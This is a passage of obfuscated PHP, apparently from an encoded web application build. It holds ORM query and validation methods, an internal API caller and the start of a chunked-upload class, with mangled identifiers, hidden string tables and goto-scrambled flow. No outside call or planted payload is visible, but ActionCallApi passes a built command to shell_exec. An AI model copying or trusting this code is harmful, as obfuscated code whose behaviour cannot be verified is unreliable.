$EàªŒŞŞéÛ[$B‹…ŠÏ…İ»[0]]) { unset($EàªŒŞŞéÛ[$B‹…ŠÏ…İ»[0]]); } } } } return $EàªŒŞŞéÛ; } protected function autoValidation($bè¯¬ÙÎÇ, $fÛÒñé¬„ƒ) { $d˜Ïã­ÏÃã =& $_SERVER[õëù©û]; if (!empty($this->options[$d˜Ïã­ÏÃã[309]])) { $BáŞÛòšÂç = $this->options[$d˜Ïã­ÏÃã[309]]; unset($this->options[$d˜Ïã­ÏÃã[309]]); } elseif (!empty($this->_validate)) { $BáŞÛòšÂç = $this->_validate; } if (isset($BáŞÛòšÂç)) { if ($this->patchValidate) { $this->error = array(); } foreach ($BáŞÛòšÂç as $aÙÏ¡ŠÇîµ => $FìÁÃãÆÈÈ) { if (empty($FìÁÃãÆÈÈ[5]) || $FìÁÃãÆÈÈ[5] == THINK_MODEL_BOTH || $FìÁÃãÆÈÈ[5] == $fÛÒñé¬„ƒ) { if (0 == strpos($FìÁÃãÆÈÈ[2], $d˜Ïã­ÏÃã[310]) && strpos($FìÁÃãÆÈÈ[2], $d˜Ïã­ÏÃã[311])) { $FìÁÃãÆÈÈ[2] = think_lang(substr($FìÁÃãÆÈÈ[2], 2, -1)); } $FìÁÃãÆÈÈ[3] = isset($FìÁÃãÆÈÈ[3]) ? $FìÁÃãÆÈÈ[3] : THINK_EXISTS_VALIDATE; $FìÁÃãÆÈÈ[4] = isset($FìÁÃãÆÈÈ[4]) ? $FìÁÃãÆÈÈ[4] : $d˜Ïã­ÏÃã[312]; switch ($FìÁÃãÆÈÈ[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($bè¯¬ÙÎÇ, $FìÁÃãÆÈÈ)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($d˜Ïã­ÏÃã[33] != trim($bè¯¬ÙÎÇ[$FìÁÃãÆÈÈ[0]])) { if (!1 === $this->_validationField($bè¯¬ÙÎÇ, $FìÁÃãÆÈÈ)) { return !1; } } break; default: if (isset($bè¯¬ÙÎÇ[$FìÁÃãÆÈÈ[0]])) { if (!1 === $this->_validationField($bè¯¬ÙÎÇ, $FìÁÃãÆÈÈ)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($F‰½¬Èäë, $a¦îÂ±¬ğÖ) { if (!1 === $this->_validationFieldItem($F‰½¬Èäë, $a¦îÂ±¬ğÖ)) { if ($this->patchValidate) { $this->error[$a¦îÂ±¬ğÖ[0]] = $a¦îÂ±¬ğÖ[2]; } else { $this->error = $a¦îÂ±¬ğÖ[2]; return !1; } } return; } protected function _validationFieldItem($b‰ÍÃÆ‰Ã, $cŸ…¦ÃàÕ–) { $dÀˆ›Ê×ó’ =& $_SERVER[õëù©û]; switch (strtolower(trim($cŸ…¦ÃàÕ–[4]))) { case $dÀˆ›Ê×ó’[305]: case $dÀˆ›Ê×ó’[306]: $FÉÇ£êâá = isset($cŸ…¦ÃàÕ–[6]) ? (array) $cŸ…¦ÃàÕ–[6] : array(); if (is_string($cŸ…¦ÃàÕ–[0]) && strpos($cŸ…¦ÃàÕ–[0], $dÀˆ›Ê×ó’[47])) { $cŸ…¦ÃàÕ–[0] = explode($dÀˆ›Ê×ó’[47], $cŸ…¦ÃàÕ–[0]); } if (is_array($cŸ…¦ÃàÕ–[0])) { foreach ($cŸ…¦ÃàÕ–[0] as $B¡åËŞóƒ‰) { $Fê¥‰ À[$B¡åËŞóƒ‰] = $b‰ÍÃÆ‰Ã[$B¡åËŞóƒ‰]; } array_unshift($FÉÇ£êâá, $Fê¥‰ À); } else { array_unshift($FÉÇ£êâá, $b‰ÍÃÆ‰Ã[$cŸ…¦ÃàÕ–[0]]); } if ($dÀˆ›Ê×ó’[305] == $cŸ…¦ÃàÕ–[4]) { return call_user_func_array($cŸ…¦ÃàÕ–[1], $FÉÇ£êâá); } else { return call_user_func_array(array(&$this, $cŸ…¦ÃàÕ–[1]), $FÉÇ£êâá); } case $dÀˆ›Ê×ó’[313]: return $b‰ÍÃÆ‰Ã[$cŸ…¦ÃàÕ–[0]] == $b‰ÍÃÆ‰Ã[$cŸ…¦ÃàÕ–[1]]; case $dÀˆ›Ê×ó’[314]: if (is_string($cŸ…¦ÃàÕ–[0]) && strpos($cŸ…¦ÃàÕ–[0], $dÀˆ›Ê×ó’[47])) { $cŸ…¦ÃàÕ–[0] = explode($dÀˆ›Ê×ó’[47], $cŸ…¦ÃàÕ–[0]); } $aË£İåÁ‰ã = array(); if (is_array($cŸ…¦ÃàÕ–[0])) { foreach ($cŸ…¦ÃàÕ–[0] as $B¡åËŞóƒ‰) { $aË£İåÁ‰ã[$B¡åËŞóƒ‰] = $b‰ÍÃÆ‰Ã[$B¡åËŞóƒ‰]; } } else { $aË£İåÁ‰ã[$cŸ…¦ÃàÕ–[0]] = $b‰ÍÃÆ‰Ã[$cŸ…¦ÃàÕ–[0]]; } if (!empty($b‰ÍÃÆ‰Ã[$this->getPk()])) { $aË£İåÁ‰ã[$this->getPk()] = array($dÀˆ›Ê×ó’[315], $b‰ÍÃÆ‰Ã[$this->getPk()]); } if ($this->where($aË£İåÁ‰ã)->find()) { return !1; } return !0; default: return $this->check($b‰ÍÃÆ‰Ã[$cŸ…¦ÃàÕ–[0]], $cŸ…¦ÃàÕ–[1], $cŸ…¦ÃàÕ–[4]); } } public function check($FÅ‡´æ™ÈĞ, $Fñ™ËÏÊ§Å, $BõÃëÑÈ = "\x72\145\x67\x65\170") { $BÃªèÜ =& $_SERVER[õëù©û]; $BõÃëÑÈ = strtolower(trim($BõÃëÑÈ)); switch ($BõÃëÑÈ) { case $BÃªèÜ[7]: case $BÃªèÜ[316]: $bï‡´êïÃ = is_array($Fñ™ËÏÊ§Å) ? $Fñ™ËÏÊ§Å : explode($BÃªèÜ[47], $Fñ™ËÏÊ§Å); return $BõÃëÑÈ == $BÃªèÜ[7] ? in_array($FÅ‡´æ™ÈĞ, $bï‡´êïÃ) : !in_array($FÅ‡´æ™ÈĞ, $bï‡´êïÃ); case $BÃªèÜ[317]: case $BÃªèÜ[318]: if (is_array($Fñ™ËÏÊ§Å)) { $dßÏ¡™“İ¸ = $Fñ™ËÏÊ§Å[0]; $F•İÏ‚Œ¦ë = $Fñ™ËÏÊ§Å[1]; } else { list($dßÏ¡™“İ¸, $F•İÏ‚Œ¦ë) = explode($BÃªèÜ[47], $Fñ™ËÏÊ§Å); } return $BõÃëÑÈ == $BÃªèÜ[317] ? $FÅ‡´æ™ÈĞ >= $dßÏ¡™“İ¸ && $FÅ‡´æ™ÈĞ <= $F•İÏ‚Œ¦ë : $FÅ‡´æ™ÈĞ < $dßÏ¡™“İ¸ || $FÅ‡´æ™ÈĞ > $F•İÏ‚Œ¦ë; case $BÃªèÜ[319]: case $BÃªèÜ[320]: return $BõÃëÑÈ == $BÃªèÜ[319] ? $FÅ‡´æ™ÈĞ == $Fñ™ËÏÊ§Å : $FÅ‡´æ™ÈĞ != $Fñ™ËÏÊ§Å; case $BÃªèÜ[321]: $c°š›òÅ´‰ = mb_strlen($FÅ‡´æ™ÈĞ, $BÃªèÜ[322]); if (strpos($Fñ™ËÏÊ§Å, $BÃªèÜ[47])) { list($dßÏ¡™“İ¸, $F•İÏ‚Œ¦ë) = explode($BÃªèÜ[47], $Fñ™ËÏÊ§Å); return $c°š›òÅ´‰ >= $dßÏ¡™“İ¸ && $c°š›òÅ´‰ <= $F•İÏ‚Œ¦ë; } else { return $c°š›òÅ´‰ == $Fñ™ËÏÊ§Å; } case $BÃªèÜ[323]: list($bÂ¼›¿°Òô, $b¬¿‰‡ˆæ©) = explode($BÃªèÜ[47], $Fñ™ËÏÊ§Å); if (!is_numeric($bÂ¼›¿°Òô)) { $bÂ¼›¿°Òô = strtotime($bÂ¼›¿°Òô); } if (!is_numeric($b¬¿‰‡ˆæ©)) { $b¬¿‰‡ˆæ© = strtotime($b¬¿‰‡ˆæ©); } return NOW_TIME >= $bÂ¼›¿°Òô && NOW_TIME <= $b¬¿‰‡ˆæ©; case $BÃªèÜ[324]: return in_array(get_client_ip(), explode($BÃªèÜ[47], $Fñ™ËÏÊ§Å)); case $BÃªèÜ[325]: return !in_array(get_client_ip(), explode($BÃªèÜ[47], $Fñ™ËÏÊ§Å)); case $BÃªèÜ[312]: default: return $this->regex($FÅ‡´æ™ÈĞ, $Fñ™ËÏÊ§Å); } } public function query($DíÏö‚±Š, $c½ç¡ÚÍ¤¼ = false) { $DãÂÒÑé =& $_SERVER[õëù©û]; if (!is_bool($c½ç¡ÚÍ¤¼) && !is_array($c½ç¡ÚÍ¤¼)) { $c½ç¡ÚÍ¤¼ = func_get_args(); array_shift($c½ç¡ÚÍ¤¼); } $DíÏö‚±Š = str_replace(array($DãÂÒÑé[213], $DãÂÒÑé[326]), $DãÂÒÑé[50], $DíÏö‚±Š); $DíÏö‚±Š = $this->parseSql($DíÏö‚±Š, $c½ç¡ÚÍ¤¼); return $this->db->query($DíÏö‚±Š); } public function execute($cøéîÚŸ–, $d…ƒ¦Š¼‘Ï = false) { if (!is_bool($d…ƒ¦Š¼‘Ï) && !is_array($d…ƒ¦Š¼‘Ï)) { $d…ƒ¦Š¼‘Ï = func_get_args(); array_shift($d…ƒ¦Š¼‘Ï); } $cøéîÚŸ– = $this->parseSql($cøéîÚŸ–, $d…ƒ¦Š¼‘Ï); return $this->db->execute($cøéîÚŸ–); } protected function parseSql($B¢Ÿ’¾âÍ·, $FÁÔÆ‡šŞĞ) { $AÚÉîˆÚ•  =& $_SERVER[õëù©û]; if (!0 === $FÁÔÆ‡šŞĞ) { $cÀòåĞƒ — = $this->_parseOptions(); $B¢Ÿ’¾âÍ· = $this->db->parseSql($B¢Ÿ’¾âÍ·, $cÀòåĞƒ —); } elseif (is_array($FÁÔÆ‡šŞĞ)) { $FÁÔÆ‡šŞĞ = array_map(array($this->db, $AÚÉîˆÚ• [327]), $FÁÔÆ‡šŞĞ); $B¢Ÿ’¾âÍ· = vsprintf($B¢Ÿ’¾âÍ·, $FÁÔÆ‡šŞĞ); } else { $B¢Ÿ’¾âÍ· = strtr($B¢Ÿ’¾âÍ·, array($AÚÉîˆÚ• [328] => $this->getTableName(), $AÚÉîˆÚ• [329] => think_config($AÚÉîˆÚ• [228]))); } $this->db->setModel($this->name); return $B¢Ÿ’¾âÍ·; } public function db($dÛëé‹Ç– = '', $e¹Üèôº­¿ = '', $B§‚ä×îåŠ = array()) { goto D‚ÁÛ»¦£¤; B±¾«ÜŸ—í: if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; goto B»‚¶˜Ë; f’ÄèŒó³Ë: $EÆÄêÅíÔä[$dÛëé‹Ç–] = $e¹Üèôº­¿; $this->db = $aö¨³©šÅ¼[$dÛëé‹Ç–]; $this->_after_db(); goto B±¾«ÜŸ—í; D‚ÁÛ»¦£¤: $b‡Õ¿•¦´ =& $_SERVER[õëù©û]; if ($b‡Õ¿•¦´[33] === $dÛëé‹Ç– && $this->db) { return $this->db; } static $EÆÄêÅíÔä = array(); goto B¤”·ï‡¦ƒ; B¤”·ï‡¦ƒ: static $aö¨³©šÅ¼ = array(); if (!isset($aö¨³©šÅ¼[$dÛëé‹Ç–]) || isset($aö¨³©šÅ¼[$dÛëé‹Ç–]) && $e¹Üèôº­¿ && $EÆÄêÅíÔä[$dÛëé‹Ç–] != $e¹Üèôº­¿) { if (!empty($e¹Üèôº­¿) && is_string($e¹Üèôº­¿) && !1 === strpos($e¹Üèôº­¿, $b‡Õ¿•¦´[8])) { $e¹Üèôº­¿ = think_config($e¹Üèôº­¿); } $aö¨³©šÅ¼[$dÛëé‹Ç–] = Db::getInstance($e¹Üèôº­¿); } elseif (NULL === $e¹Üèôº­¿) { $aö¨³©šÅ¼[$dÛëé‹Ç–]->close(); unset($aö¨³©šÅ¼[$dÛëé‹Ç–]); return; } if (!empty($B§‚ä×îåŠ)) { if (is_string($B§‚ä×îåŠ)) { parse_str($B§‚ä×îåŠ, $B§‚ä×îåŠ); } foreach ($B§‚ä×îåŠ as $c÷¯†ÅÁÙÀ => $d®³’‹±²) { $this->setProperty($c÷¯†ÅÁÙÀ, $d®³’‹±²); } } goto f’ÄèŒó³Ë; B»‚¶˜Ë: } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $d‰Æàóµ¿¿ = get_class($this); if ($d‰Æàóµ¿¿ == $_SERVER[õëù©û][330]) { return $this->name; } $this->name = substr($d‰Æàóµ¿¿, 0, -5); } return $this->name; } public function getTableName() { $F„ÂÇÒ„ä‚ =& $_SERVER[õëù©û]; if (empty($this->trueTableName)) { $CÆš°àµêË = !empty($this->tablePrefix) ? $this->tablePrefix : $F„ÂÇÒ„ä‚[33]; if (!empty($this->tableName)) { $CÆš°àµêË .= $this->tableName; } else { $CÆš°àµêË .= think_parse_name($this->name); } $this->trueTableName = strtolower($CÆš°àµêË); } return (!empty($this->dbName) ? $this->dbName . $F„ÂÇÒ„ä‚[91] : $F„ÂÇÒ„ä‚[33]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $aí‘ĞÌŠÕƒ =& $_SERVER[õëù©û]; return isset($this->fields[$aí‘ĞÌŠÕƒ[235]]) ? $this->fields[$aí‘ĞÌŠÕƒ[235]] : $this->pk; } public function getDbFields() { $cÑèÑª×ğ =& $_SERVER[õëù©û]; if (isset($this->options[$cÑèÑª×ğ[263]])) { $E¯ìï…Åä = $this->db->getFields($this->options[$cÑèÑª×ğ[263]]); return $E¯ìï…Åä ? array_keys($E¯ìï…Åä) : !1; } if ($this->fields) { $E¯ìï…Åä = $this->fields; unset($E¯ìï…Åä[$cÑèÑª×ğ[234]], $E¯ìï…Åä[$cÑèÑª×ğ[235]], $E¯ìï…Åä[$cÑèÑª×ğ[236]], $E¯ìï…Åä[$cÑèÑª×ğ[233]]); return $E¯ìï…Åä; } return !1; } public function data($aâœ˜®„ğ¯ = '') { $b™ùÉ‚” =& $_SERVER[õëù©û]; if ($b™ùÉ‚”[33] === $aâœ˜®„ğ¯ && !empty($this->data)) { return $this->data; } if (is_object($aâœ˜®„ğ¯)) { $aâœ˜®„ğ¯ = get_object_vars($aâœ˜®„ğ¯); } elseif (is_string($aâœ˜®„ğ¯)) { parse_str($aâœ˜®„ğ¯, $aâœ˜®„ğ¯); } elseif (!is_array($aâœ˜®„ğ¯)) { think_exception(think_lang($b™ùÉ‚”[255])); } $this->data = $aâœ˜®„ğ¯; return $this; } public function join($b—ÛŒê¹ñÔ) { $f‰ä”ŒŠë· =& $_SERVER[õëù©û]; if (is_array($b—ÛŒê¹ñÔ)) { $this->options[$f‰ä”ŒŠë·[266]] = $b—ÛŒê¹ñÔ; } elseif (!empty($b—ÛŒê¹ñÔ)) { $this->options[$f‰ä”ŒŠë·[266]][] = $b—ÛŒê¹ñÔ; } return $this; } public function union($AĞæÔ¿ëÆ, $e—§ƒÙ“½ã = false) { goto a¨„èÏâ …; a¨„èÏâ …: $dÖã‹´ç§¥ =& $_SERVER[õëù©û]; if (empty($AĞæÔ¿ëÆ)) { return $this; } if ($e—§ƒÙ“½ã) { $this->options[$dÖã‹´ç§¥[331]][$dÖã‹´ç§¥[332]] = !0; } goto D³ŞŸ¬êŠ½; b½º¾Ùå«‹: return $this; goto bğö¦«§¾Õ; D³ŞŸ¬êŠ½: if (is_object($AĞæÔ¿ëÆ)) { $AĞæÔ¿ëÆ = get_object_vars($AĞæÔ¿ëÆ); } if (is_string($AĞæÔ¿ëÆ)) { $aÇ­³õŠ = $AĞæÔ¿ëÆ; } elseif (is_array($AĞæÔ¿ëÆ)) { if (isset($AĞæÔ¿ëÆ[0])) { $this->options[$dÖã‹´ç§¥[331]] = array_merge($this->options[$dÖã‹´ç§¥[331]], $AĞæÔ¿ëÆ); return $this; } else { $aÇ­³õŠ = $AĞæÔ¿ëÆ; } } else { think_exception(think_lang($dÖã‹´ç§¥[255])); } $this->options[$dÖã‹´ç§¥[331]][] = $aÇ­³õŠ; goto b½º¾Ùå«‹; bğö¦«§¾Õ: } public function cache($BÇÏÇ„¤Ğİ = true, $d–Éíš®áÂ = null, $eèïÔÓ± = '') { $a•‹ÉÙ»¶ =& $_SERVER[õëù©û]; if (!1 !== $BÇÏÇ„¤Ğİ) { $this->options[$a•‹ÉÙ»¶[333]] = array($a•‹ÉÙ»¶[89] => $BÇÏÇ„¤Ğİ, $a•‹ÉÙ»¶[323] => $d–Éíš®áÂ, $a•‹ÉÙ»¶[29] => $eèïÔÓ±); } return $this; } public function field($cêšÎĞ°›Ğ, $Fƒî˜ôìÉí = false) { $FÒª‹‘ Ñ =& $_SERVER[õëù©û]; if (!0 === $cêšÎĞ°›Ğ) { $f¨Âì´¦ØÂ = $this->getDbFields(); $cêšÎĞ°›Ğ = $f¨Âì´¦ØÂ ? $f¨Âì´¦ØÂ : $FÒª‹‘ Ñ[172]; } elseif ($Fƒî˜ôìÉí) { if (is_string($cêšÎĞ°›Ğ)) { $cêšÎĞ°›Ğ = explode($FÒª‹‘ Ñ[47], $cêšÎĞ°›Ğ); } $f¨Âì´¦ØÂ = $this->getDbFields(); $cêšÎĞ°›Ğ = $f¨Âì´¦ØÂ ? array_diff($f¨Âì´¦ØÂ, $cêšÎĞ°›Ğ) : $cêšÎĞ°›Ğ; } $this->options[$FÒª‹‘ Ñ[257]] = $cêšÎĞ°›Ğ; return $this; } public function scope($Aƒ‡¡à–ë = '', $d×øË°…šğ = NULL) { $a„‚¢î— Ú =& $_SERVER[õëù©û]; if ($a„‚¢î— Ú[33] === $Aƒ‡¡à–ë) { if (isset($this->_scope[$a„‚¢î— Ú[34]])) { $d»˜Œ«Ñ = $this->_scope[$a„‚¢î— Ú[34]]; } else { return $this; } } elseif (is_string($Aƒ‡¡à–ë)) { $EÛ­Ó¯ôÆë = explode($a„‚¢î— Ú[47], $Aƒ‡¡à–ë); $d»˜Œ«Ñ = array(); foreach ($EÛ­Ó¯ôÆë as $Fã‰²Ò‰ÊÃ) { if (!isset($this->_scope[$Fã‰²Ò‰ÊÃ])) { continue; } $d»˜Œ«Ñ = array_merge($d»˜Œ«Ñ, $this->_scope[$Fã‰²Ò‰ÊÃ]); } if (!empty($d×øË°…šğ) && is_array($d×øË°…šğ)) { $d»˜Œ«Ñ = array_merge($d»˜Œ«Ñ, $d×øË°…šğ); } } elseif (is_array($Aƒ‡¡à–ë)) { $d»˜Œ«Ñ = $Aƒ‡¡à–ë; } if (is_array($d»˜Œ«Ñ) && !empty($d»˜Œ«Ñ)) { $this->options = array_merge($this->options, array_change_key_case($d»˜Œ«Ñ)); } return $this; } public function where($aêŸì†Ë, $FÆÏŒ„¸è = null) { $b„–•ô†æë =& $_SERVER[õëù©û]; if (!is_null($FÆÏŒ„¸è) && is_string($aêŸì†Ë)) { if (!is_array($FÆÏŒ„¸è)) { $FÆÏŒ„¸è = func_get_args(); array_shift($FÆÏŒ„¸è); } $FÆÏŒ„¸è = array_map(array($this->db, $b„–•ô†æë[327]), $FÆÏŒ„¸è); $aêŸì†Ë = vsprintf($aêŸì†Ë, $FÆÏŒ„¸è); } elseif (is_object($aêŸì†Ë)) { $aêŸì†Ë = get_object_vars($aêŸì†Ë); } elseif (is_array($aêŸì†Ë)) { foreach ($aêŸì†Ë as $e±Š·¾’¸Î => $fÔ¤óÄ‰Â¶) { if ((is_numeric($e±Š·¾’¸Î) || !$e±Š·¾’¸Î) && is_string($fÔ¤óÄ‰Â¶)) { think_trace($b„–•ô†æë[334], $b„–•ô†æë[33], $b„–•ô†æë[46]); die; } } } if (is_string($aêŸì†Ë) && $b„–•ô†æë[33] != $aêŸì†Ë) { $e«Èåì“†³ = array(); $e«Èåì“†³[$b„–•ô†æë[335]] = $aêŸì†Ë; $aêŸì†Ë = $e«Èåì“†³; } if (isset($this->options[$b„–•ô†æë[259]])) { $this->options[$b„–•ô†æë[259]] = array_merge($this->options[$b„–•ô†æë[259]], $aêŸì†Ë); } else { $this->options[$b„–•ô†æë[259]] = $aêŸì†Ë; } return $this; } public function limit($F×Ÿ’·º, $F±Ùè‚Ğ›Ë = null) { $DÔæöÌ°à =& $_SERVER[õëù©û]; $this->options[$DÔæöÌ°à[276]] = is_null($F±Ùè‚Ğ›Ë) ? $F×Ÿ’·º : $F×Ÿ’·º . $DÔæöÌ°à[47] . $F±Ùè‚Ğ›Ë; return $this; } public function page($A–ã¾§ğØ‚, $C•ÕâºÂ¬‡ = null) { $D–²ÉóÈ¯ñ =& $_SERVER[õëù©û]; $this->options[$D–²ÉóÈ¯ñ[336]] = is_null($C•ÕâºÂ¬‡) ? $A–ã¾§ğØ‚ : $A–ã¾§ğØ‚ . $D–²ÉóÈ¯ñ[47] . $C•ÕâºÂ¬‡; return $this; } public function comment($cÒ®ˆõ ä·) { $this->options[$_SERVER[õëù©û][337]] = $cÒ®ˆõ ä·; return $this; } public function setProperty($EÍ·£Ö‘‰÷, $e¼â¿™…Øõ) { if (property_exists($this, $EÍ·£Ö‘‰÷)) { $this->{$EÍ·£Ö‘‰÷} = $e¼â¿™…Øõ; } return $this; } } goto fƒ«åˆÈ˜¿; C¦²°¨Š¯: function ActionCall($Aİ¹ÛÍ†) { $fñ´…¹˜Ï = array_slice(func_get_args(), 1); return ActionApply($Aİ¹ÛÍ†, $fñ´…¹˜Ï); } function ActionCallApi($cºˆšĞÑÕ, $a„·×ä©±ö = '') { goto dìáÚœ÷Ò¨; dìáÚœ÷Ò¨: $AÌìÓËŒ¹ =& $_SERVER[üá]; $B×òô„°¦œ = $a„·×ä©±ö; if (is_array($a„·×ä©±ö)) { $B×òô„°¦œ = $AÌìÓËŒ¹[20]; foreach ($a„·×ä©±ö as $eº­¡¯—à => $CÎˆÅéŠ¨ê) { $CÎˆÅéŠ¨ê = is_array($CÎˆÅéŠ¨ê) ? json_encode($CÎˆÅéŠ¨ê) : $CÎˆÅéŠ¨ê; $CÎˆÅéŠ¨ê = is_bool($CÎˆÅéŠ¨ê) ? intval($CÎˆÅéŠ¨ê) : $CÎˆÅéŠ¨ê; $B×òô„°¦œ .= $AÌìÓËŒ¹[21] . $eº­¡¯—à . $AÌìÓËŒ¹[22] . rawurlencode($CÎˆÅéŠ¨ê); } } goto dÚ‰‰åÀ¾; eĞŞ³ÚÒÍ: return $E„„«…­ÊÀ; goto bÕÀ‘“Á¿ø; D‚¾‘Èà¶À: $D­Õ¯Õ™… = json_decode($E… œ‚–»Á, !0); $E„„«…­ÊÀ = is_array($D­Õ¯Õ™…) ? $D­Õ¯Õ™… : array($AÌìÓËŒ¹[33] => null, $AÌìÓËŒ¹[34] => $E… œ‚–»Á); if (!$D­Õ¯Õ™…) { echo $E… œ‚–»Á; } goto eĞŞ³ÚÒÍ; dÚ‰‰åÀ¾: $aâ²İÌ‰¥ = Action($AÌìÓËŒ¹[23])->accessToken(); $cºˆšĞÑÕ = str_replace($AÌìÓËŒ¹[5], $AÌìÓËŒ¹[4], $cºˆšĞÑÕ) . $AÌìÓËŒ¹[24] . $aâ²İÌ‰¥ . $B×òô„°¦œ; $E… œ‚–»Á = $AÌìÓËŒ¹[20]; goto B–Í¥Èø¥†; B–Í¥Èø¥†: $a•©ñ›¦çé = phpBinCommand(); if ($a•©ñ›¦çé && function_exists($AÌìÓËŒ¹[25])) { $D×ìå»†ÆŒ = $a•©ñ›¦çé . $AÌìÓËŒ¹[26] . BASIC_PATH . $AÌìÓËŒ¹[27] . escapeshellarg($cºˆšĞÑÕ); $E… œ‚–»Á = shell_exec($D×ìå»†ÆŒ); } if (!$E… œ‚–»Á) { $F»öùæ¼½ª = stream_context_create(array($AÌìÓËŒ¹[28] => array($AÌìÓËŒ¹[29] => 20, $AÌìÓËŒ¹[30] => $AÌìÓËŒ¹[31]))); $E… œ‚–»Á = file_get_contents(APP_HOST . $AÌìÓËŒ¹[32] . $cºˆšĞÑÕ, !1, $F»öùæ¼½ª); } goto D‚¾‘Èà¶À; bÕÀ‘“Á¿ø: } function ActionCallHook($E³–¡ÂÑ–) { goto f§ÈÛòÚ; f§ÈÛòÚ: $bÚÌØ¤õ®æ =& $_SERVER[üá]; ob_start(); $Eëõ“¢Ê› = array_slice(func_get_args(), 1); goto e±ñÂÜáòÜ; e±ñÂÜáòÜ: $GLOBALS[$bÚÌØ¤õ®æ[35]] = 1; $A™àÙË‚Ï = ActionApply($E³–¡ÂÑ–, $Eëõ“¢Ê›); $A¦ëßŞš°ä = ob_get_clean(); goto d²õŒÜÈÑ; d²õŒÜÈÑ: $A™àÙË‚Ï = $A¦ëßŞš°ä ? json_decode($A¦ëßŞš°ä, !0) : $A™àÙË‚Ï; $GLOBALS[$bÚÌØ¤õ®æ[35]] = 0; return $A™àÙË‚Ï; goto aóØÙõğ½›; aóØÙõğ½›: } goto CÏˆ³„÷Šº; f¾‚àİêê: if (class_exists($_SERVER[õëù©û][1930])) { class Services_JSON_Error extends PEAR_Error { function __construct($aå¨Ó„ ©ò = "\x75\156\x6b\x6e\157\167\156\40\145\162\162\x6f\x72", $E÷×¼š›Á· = null, $D‘»˜¡¢…õ = null, $E“‘ÊŸ·§ = null, $Aôù¹»íÅ = null) { parent::PEAR_Error($aå¨Ó„ ©ò, $E÷×¼š›Á·, $D‘»˜¡¢…õ, $E“‘ÊŸ·§, $Aôù¹»íÅ); } } } else { class Services_JSON_Error { function __construct($fß£¿‰ö¹¯ = "\165\156\153\x6e\157\x77\x6e\x20\x65\162\162\x6f\162", $EóÏ‡¢‰²Š = null, $B‡ŞÜˆô³ = null, $bßÂºß” = null, $fŒÖÍÂŒ¢ = null) { } } } class Uploader { public $fileName; public $uploadFile; public $tempFile; public function __construct() { goto cÄïÍµÌ ¤; D¬£æãÊÎ¢: if (!empty($_FILES)) { $BèØâ™Ÿà© = $_FILES[$b›¬ã–¿šŠ[163]]; $this->uploadFile = $BèØâ™Ÿà©[$b›¬ã–¿šŠ[1931]]; if (!$this->uploadFile && $BèØâ™Ÿà©[$b›¬ã–¿šŠ[1202]] > 0) { show_json($this->errorInfo($BèØâ™Ÿà©[$b›¬ã–¿šŠ[1202]]), !1); } } else { if (isset($in[$b›¬ã–¿šŠ[382]])) { $this->uploadFile = isset($in[$b›¬ã–¿šŠ[1932]]) ? $b›¬ã–¿šŠ[1933] : $b›¬ã–¿šŠ[1778]; } } $this->fileName = self::fileName(); $this->statusData = !1; goto A²È„—©Ç‘; cÄïÍµÌ ¤: $b›¬ã–¿šŠ =& $_SERVER[õëù©û]; global $in; $this->in =& $in; goto D¬£æãÊÎ¢; A²È„—©Ç‘: $this->checkSize(); $this->tempPathInit(); goto AÑÃ²ÃÑ; AÑÃ²ÃÑ: } public function upload() { goto cêŸ‹Œ×ÊÜ; e„¥ßË„ß: $DÙ”ø±…¸ä = $this->tempFile . $CÇô»É‚ˆŠ[1936] . $bë¹Ãóïì; $a˜Ú³¥ÉİÄ = isset($this->in[$CÇô»É‚ˆŠ[515]]) ? intval($this->in[$CÇô»É‚ˆŠ[515]]) : 0; $Fäù¨Ê§³â = isset($this->in[$CÇô»É‚ˆŠ[1937]]) ? intval($this->in[$CÇô»É‚ˆŠ[1937]]) : 0; goto C³ÄåíÒ”«; b—‹¨Ö¨œ: CacheLock::lock($this->tempFile, 20); $EĞªóˆËÛ = $this->statusGet(); $this->initFileTemp(); goto DÀË†…‚»Û; cêŸ‹Œ×ÊÜ: $CÇô»É‚ˆŠ =& $_SERVER[õëù©û]; $bë¹Ãóïì = isset($this->in[$CÇô»É‚ˆŠ[1934]]) ? intval($this->in[$CÇô»É‚ˆŠ[1934]]) : 0; $aï½Ô¦İù¸ = isset($this->in[$CÇô»É‚ˆŠ[1935]]) ? intval($this->in[$CÇô»É‚ˆŠ[1935]]) : 1; goto e„¥ßË„ß; cæ’«Œ”¢: @unlink($eÃÛ¬¤„õ); if (!$a¢ˆ±Šö¶²) { $this->showJson($CÇô»É‚ˆŠ[1942] . $bë¹Ãóïì, !1); } $EĞªóˆËÛ[$CÇô»É‚ˆŠ[1943]] = $aï½Ô¦İù¸; goto e¿†º×à¢‘; D¾æÔ¼ßÅ: $a¢ˆ±Šö¶² = $this->writeTo($eÃÛ¬¤„õ, $bƒà‘Ë‘»¯, $this->tempFile); $aï´Å¸ŒĞÑ = IO::hashSimple($eÃÛ¬¤„õ); $a˜Ú³¥ÉİÄ = IO::size($eÃÛ¬¤„õ); goto cæ’«Œ”¢; e¿†º×à¢‘: $EĞªóˆËÛ[$CÇô»É‚ˆŠ[1944]][$CÇô»É‚ˆŠ[1945] . $bë¹Ãóïì] = array($CÇô»É‚ˆŠ[1946] => $fÊ…‚Â†’‚, $CÇô»É‚ˆŠ[1027] => $bë¹Ãóïì, $CÇô»É‚ˆŠ[77] => $a˜Ú³¥ÉİÄ, $CÇô»É‚ˆŠ[160] => $aï´Å¸ŒĞÑ); $this->statusSet($EĞªóˆËÛ); if (count($EĞªóˆËÛ[$CÇô»É‚ˆŠ[1944]]) != $EĞªóˆËÛ[$CÇô»É‚ˆŠ[1943]]) { $this->showJson($CÇô»É‚ˆŠ[1947] . $bë¹Ãóïì, !0); } goto C»·©Ï§ğ¹; FÕ°­ôÚŠ: CacheLock::unlock($this->tempFile); return $this->tempFile; goto FÏâö¶ğ¥æ; C»·©Ï§ğ¹: ignore_timeout(); if (!$this->checkChunkHash($EĞªóˆËÛ)) { $this->showJson($CÇô»É‚ˆŠ[1948], !1); } $this->statusSet(!1); goto FÕ°­ôÚŠ; DÀË†…‚»Û: 